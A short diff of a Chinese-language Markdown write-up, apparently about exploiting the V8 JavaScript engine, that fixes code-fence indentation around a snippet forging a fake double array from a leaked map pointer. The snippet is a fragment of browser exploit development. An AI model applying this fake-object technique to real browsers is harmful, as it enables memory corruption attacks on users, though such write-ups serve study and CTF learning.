@@ -144,13 +144,13 @@ print(doublemap.toString(16));
 用同样的方法，读取 x 的 elements 字段的值
 
 ### 伪造 double array
- ```C
+```C
 view.setBigUint64(0, 0x200000000n, true);
 x[3] = view.getFloat64(0, true);
 
 view.setBigInt64(0, doublemap, true);
 x[0] = view.getFloat64(0, true);
- ```
+```
 `x[0]`~`x[3]` 凑成一个 `fake array object`，其中 properties 字段为 0。
 
 ### 获取 fake array object
